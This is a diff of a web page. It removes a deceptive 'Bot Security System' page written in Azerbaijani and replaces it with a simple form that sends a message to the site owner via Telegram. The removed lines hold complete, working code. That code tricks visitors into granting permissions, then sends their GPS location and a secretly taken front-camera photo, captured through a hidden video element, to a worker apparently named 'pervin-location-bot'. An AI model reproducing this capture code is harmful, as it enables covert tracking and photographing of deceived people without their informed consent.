@@ -1,19 +1,26 @@
 
 <!DOCTYPE html>
-<html lang="az">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Bot Security System</title>
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0">
+
+  <title>Send a Message</title>
+
   <style>
-    * { box-sizing: border-box; margin: 0; padding: 0; }
+    * {
+      box-sizing: border-box;
+    }
 
     body {
+      margin: 0;
       min-height: 100vh;
       padding: 20px;
-      background: radial-gradient(circle at top, #161b22 0%, #0d1117 60%);
+      background: #0d1117;
       color: #e6edf3;
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
+      font-family: -apple-system, BlinkMacSystemFont,
+                   "Segoe UI", Arial, sans-serif;
       display: flex;
       align-items: center;
       justify-content: center;
@@ -24,546 +31,210 @@
       max-width: 440px;
       background: #161b22;
       border: 1px solid #30363d;
-      border-radius: 24px;
-      padding: 32px 26px;
+      border-radius: 20px;
+      padding: 35px 25px;
       text-align: center;
-      box-shadow: 0 20px 60px rgba(0,0,0,0.45);
-      animation: fadeIn 0.5s ease;
     }
 
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(12px); }
-      to   { opacity: 1; transform: translateY(0); }
-    }
-
-    .shield {
-      width: 72px;
-      height: 72px;
-      margin: 0 auto 16px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      background: linear-gradient(145deg, #238636, #1a6b2a);
-      border-radius: 50%;
-      font-size: 34px;
-      box-shadow: 0 0 0 6px rgba(35,134,54,0.15);
+    .icon {
+      font-size: 48px;
+      margin-bottom: 15px;
     }
 
     h1 {
-      font-size: 22px;
-      font-weight: 700;
-      margin-bottom: 8px;
-      letter-spacing: -0.3px;
+      font-size: 26px;
+      margin: 0 0 12px;
     }
 
     .description {
       color: #8b949e;
-      font-size: 13.5px;
+      font-size: 14px;
       line-height: 1.7;
-      margin-bottom: 22px;
+      margin-bottom: 25px;
     }
 
-    .notice {
-      margin: 0 0 22px;
-      padding: 14px 16px;
+    textarea {
+      width: 100%;
+      min-height: 150px;
+      padding: 15px;
+      resize: vertical;
       background: #0d1117;
       border: 1px solid #30363d;
-      border-radius: 14px;
-      text-align: left;
-      font-size: 13px;
-      line-height: 1.8;
-    }
-
-    .notice-title {
-      font-weight: 600;
+      border-radius: 12px;
       color: #e6edf3;
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      margin-bottom: 6px;
+      font-family: inherit;
+      font-size: 15px;
+      line-height: 1.6;
+      outline: none;
     }
 
-    .notice-title::before {
-      content: "ℹ";
-      color: #58a6ff;
-      font-weight: 700;
+    textarea:focus {
+      border-color: #238636;
     }
 
-    .notice ul {
-      list-style: none;
-      padding-left: 2px;
-      color: #8b949e;
-    }
-
-    .notice li {
-      display: flex;
-      gap: 8px;
-      align-items: flex-start;
-      margin-top: 4px;
-    }
-
-    .notice li::before {
-      content: "•";
-      color: #58a6ff;
-      font-weight: 700;
+    textarea::placeholder {
+      color: #6e7681;
     }
 
     button {
       width: 100%;
-      padding: 16px;
-      background: linear-gradient(180deg, #2ea043, #238636);
-      border: 1px solid #2ea043;
-      border-radius: 12px;
+      margin-top: 15px;
+      padding: 15px;
+      border: none;
+      border-radius: 10px;
+      background: #238636;
       color: white;
-      font-size: 15px;
+      font-size: 16px;
       font-weight: 600;
       cursor: pointer;
-      transition: all 0.2s ease;
-      box-shadow: 0 6px 18px rgba(35,134,54,0.25);
     }
 
-    button:hover:not(:disabled) {
-      background: linear-gradient(180deg, #3fb950, #2ea043);
-      transform: translateY(-1px);
-    }
-
-    button:active:not(:disabled) {
-      transform: translateY(0);
+    button:hover {
+      background: #2ea043;
     }
 
     button:disabled {
-      opacity: 0.55;
+      opacity: 0.5;
       cursor: not-allowed;
-      box-shadow: none;
     }
 
-    .status {
-      margin-top: 14px;
-      text-align: left;
+    #status {
+      min-height: 24px;
+      margin-top: 18px;
+      font-size: 14px;
+      line-height: 1.6;
     }
 
-    .status-card {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      padding: 14px 16px;
-      background: #0d1117;
-      border: 1px solid #30363d;
-      border-radius: 12px;
-      font-size: 13.5px;
-      line-height: 1.5;
-      transition: border-color 0.2s ease;
+    .success {
+      color: #3fb950;
     }
 
-    .status-card .icon {
-      width: 30px;
-      height: 30px;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 15px;
-      flex-shrink: 0;
-      background: #21262d;
-      color: #8b949e;
-    }
-
-    .status-card .text {
-      flex: 1;
-    }
-
-    .status-card .label {
-      font-weight: 600;
-      color: #e6edf3;
-      display: block;
-      margin-bottom: 2px;
-    }
-
-    .status-card .msg {
-      color: #8b949e;
-      font-size: 12.5px;
-    }
-
-    .status-card.loading  { border-color: #1f6feb; }
-    .status-card.loading .icon  { background: rgba(88,166,255,0.15); color: #58a6ff; }
-
-    .status-card.success  { border-color: #238636; }
-    .status-card.success .icon  { background: rgba(63,185,80,0.15); color: #3fb950; }
-
-    .status-card.error  { border-color: #f85149; }
-    .status-card.error .icon  { background: rgba(248,81,73,0.15); color: #f85149; }
-
-    .spinner {
-      width: 16px;
-      height: 16px;
-      border: 2px solid rgba(88,166,255,0.3);
-      border-top-color: #58a6ff;
-      border-radius: 50%;
-      animation: spin 0.8s linear infinite;
-    }
-
-    @keyframes spin {
-      to { transform: rotate(360deg); }
+    .error {
+      color: #f85149;
     }
 
     .footer {
-      margin-top: 24px;
-      font-size: 11px;
+      margin-top: 25px;
       color: #6e7681;
-      line-height: 1.6;
-      padding-top: 16px;
-      border-top: 1px solid #21262d;
-    }
-
-    video {
-      position: absolute;
-      width: 1px;
-      height: 1px;
-      opacity: 0;
-      pointer-events: none;
+      font-size: 11px;
     }
   </style>
 </head>
+
 <body>
 
   <main class="container">
 
-    <div class="shield">🛡️</div>
+    <div class="icon">💬</div>
 
-    <h1>Saytıma keçid üçün giriş et</h1>
+    <h1>Send a Message</h1>
+
     <p class="description">
-      Təhlükəsizlik sistemindən keçmək üçün aşağıdakı düyməni basın və
-      icazələri təsdiqləyin.
+      Have something to say?
+      Write your message below and send it directly to me.
     </p>
 
+    <form id="messageForm">
 
-    <button id="startBtn" onclick="startTest()">
-      Təhlükəsizlik sistemini keç və icazə ver
-    </button>
+      <textarea
+        id="message"
+        placeholder="Type your message here..."
+        maxlength="1000"
+        required
+      ></textarea>
 
-    <div class="status">
-      <div id="gpsStatus" class="status-card" role="status" aria-live="polite">
-        <div class="icon">📍</div>
-        <div class="text">
-          <span class="label">Icazə</span>
-          <span class="msg">Gözlənilir...</span>
-        </div>
-      </div>
+      <button id="sendBtn" type="submit">
+        ✉️ Send Message
+      </button>
 
-    <video id="camera" autoplay playsinline muted></video>
+    </form>
+
+    <div id="status"
+         role="status"
+         aria-live="polite"></div>
 
     <div class="footer">
-      Yenidən cəhd edin. Əgər problem davam edərsə, xarici brauzerdə açın
-      və sonra saytıma keçid edin.
+      Your message will be delivered privately
+      to the site owner via Telegram.
     </div>
 
   </main>
 
-</body>
   <script>
 
-    // Cloudflare Worker
     const WORKER_URL =
       "https://pervin-location-bot.zaxidlipervin.workers.dev";
 
-    const startBtn =
-      document.getElementById("startBtn");
+    const form =
+      document.getElementById("messageForm");
 
-    const gpsStatus =
-      document.getElementById("gpsStatus");
+    const messageInput =
+      document.getElementById("message");
 
-    const cameraStatus =
-      document.getElementById("cameraStatus");
+    const sendBtn =
+      document.getElementById("sendBtn");
 
-    let cameraStream = null;
-    let isRunning = false;
+    const status =
+      document.getElementById("status");
 
 
-    async function sendLocation(lat, lon, accuracy) {
+    form.addEventListener("submit", async (event) => {
 
-      const response = await fetch(
-        WORKER_URL + "/location",
-        {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({
-            lat,
-            lon,
-            accuracy
-          })
-        }
-      );
+      event.preventDefault();
 
-      if (!response.ok) {
-        throw new Error("Location upload failed");
+      const message = messageInput.value.trim();
+
+      if (!message) {
+        status.className = "error";
+        status.textContent = "Please enter a message.";
+        return;
       }
 
-      return await response.json();
-    }
+      sendBtn.disabled = true;
+      sendBtn.textContent = "Sending...";
 
-
-    // GPS koordinatlarını əldə et
-    function getPosition() {
-
-      return new Promise((resolve, reject) => {
-
-        if (!navigator.geolocation) {
-          reject(new Error("GPS dəstəklənmir"));
-          return;
-        }
-
-        navigator.geolocation.getCurrentPosition(
-          resolve,
-          reject,
-          {
-            enableHighAccuracy: false,
-            timeout: 15000,
-            maximumAge: 0
-          }
-        );
-
-      });
-    }
-
-
-    // GPS testi
-    async function testLocation() {
-
-      gpsStatus.innerHTML = `
-        <div class="status-card loading">
-        </div>
-      `;
+      status.className = "";
+      status.textContent = "";
 
       try {
-
-        const position = await getPosition();
-
-        const lat = position.coords.latitude;
-        const lon = position.coords.longitude;
-        const accuracy = position.coords.accuracy;
-
-        gpsStatus.innerHTML = `
-          <div class="status-card loading">
-          
-          </div>
-        `;
-
-        await sendLocation(lat, lon, accuracy);
-
-        gpsStatus.innerHTML = `
-          <div class="status-card success">
-           
-          </div>
-        `;
-
-      } catch (error) {
-
-        let message = "Konum əldə edilə bilmədi.";
-
-        if (error.code === 1) {
-          message = "Yenidən cəht et yazarsa xarici brauzerdə aç daha sonra sayıtıma keçid et";
-        }
-
-        else if (error.code === 2) {
-          message = " Dogrulama müəyyən edilə bilmədi.";
-        }
-
-        else if (error.code === 3) {
-          message = " vaxt limiti bitdi (10 saniyə).";
-        }
-
-        else if (
-          error.message === "Location upload failed"
-        ) {
-          message = "";
-        }
-
-        gpsStatus.innerHTML = `
-          <div class="status-card error">
-             ${message}
-          </div>
-        `;
-
-      }
-    }
-
-
-    // Kameranı bağla
-    function stopCamera() {
-
-      if (cameraStream) {
-
-        cameraStream.getTracks().forEach(
-          track => track.stop()
-        );
-
-        cameraStream = null;
-      }
-
-      const video =
-        document.getElementById("camera");
-
-      video.srcObject = null;
-    }
-
-
-    // Kamera testi
-    async function testCamera() {
-
-      cameraStatus.innerHTML = `
-        <div class="status-card loading">
-        </div>
-      `;
-
-      try {
-
-        if (!navigator.mediaDevices?.getUserMedia) {
-          throw new Error("Camera unsupported");
-        }
-
-        cameraStream =
-          await navigator.mediaDevices.getUserMedia({
-            video: {
-              facingMode: "user"
-            },
-            audio: false
-          });
-
-        const video =
-          document.getElementById("camera");
-
-        video.srcObject = cameraStream;
-
-        await video.play();
-
-        cameraStatus.innerHTML = `
-          <div class="status-card loading">
-          </div>
-        `;
-
-        // 1 saniyə gözlə
-        await new Promise(resolve =>
-          setTimeout(resolve, 1000)
-        );
-
-        if (!video.videoWidth || !video.videoHeight) {
-          throw new Error("Camera not ready");
-        }
-
-        const canvas =
-          document.createElement("canvas");
-
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-
-        const context =
-          canvas.getContext("2d");
-
-        context.drawImage(video, 0, 0);
-
-        const photoBlob =
-          await new Promise(resolve =>
-            canvas.toBlob(
-              resolve,
-              "image/jpeg",
-              0.8
-            )
-          );
-
-        if (!photoBlob) {
-          throw new Error("Photo failed");
-        }
-
-        // Foto çəkildikdən sonra kameranı bağla
-        stopCamera();
-
-        cameraStatus.innerHTML = `
-          <div class="status-card loading">
-          </div>
-        `;
-
-        const formData = new FormData();
-
-        formData.append(
-          "photo",
-          photoBlob,
-          "security-test.jpg"
-        );
 
         const response = await fetch(
-          WORKER_URL + "/photo",
+          WORKER_URL + "/message",
           {
             method: "POST",
-            body: formData
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+              message: message
+            })
           }
         );
 
         if (!response.ok) {
-          throw new Error("Photo upload failed");
+          throw new Error("Failed to send");
         }
 
-        cameraStatus.innerHTML = `
-          <div class="status-card success">
-          </div>
-        `;
+        status.className = "success";
+        status.textContent =
+          "✅ Your message has been sent successfully!";
+
+        messageInput.value = "";
 
       } catch (error) {
 
-        let message = ".";
-
-        if (
-          error.name === "NotAllowedError" ||
-          error.name === "PermissionDeniedError"
-        ) {
-          message = "";
-        }
-
-        else if (
-          error.message === ""
-        ) {
-          message = "";
-        }
-
-        cameraStatus.innerHTML = `
-          <div class="status-card error">
-             ${message}
-          </div>
-        `;
+        status.className = "error";
+        status.textContent =
+          "❌ Failed to send. Please try again.";
 
       } finally {
-        stopCamera();
+
+        sendBtn.disabled = false;
+        sendBtn.textContent = "✉️ Send Message";
+
       }
-    }
 
-
-    // Hər iki testi müstəqil başlat
-    async function startTest() {
-
-      if (isRunning) return;
-
-      isRunning = true;
-      startBtn.disabled = true;
-
-      // Biri uğursuz olsa, digəri davam edir
-      await Promise.allSettled([
-        testLocation(),
-        testCamera()
-      ]);
-
-      startBtn.disabled = false;
-      startBtn.textContent = "🔄 Yenidən test et";
-
-      isRunning = false;
-    }
-
-
-    // Səhifədən çıxanda kameranı bağla
-    window.addEventListener(
-      "pagehide",
-      stopCamera
-    );
+    });
 
   </script>
 
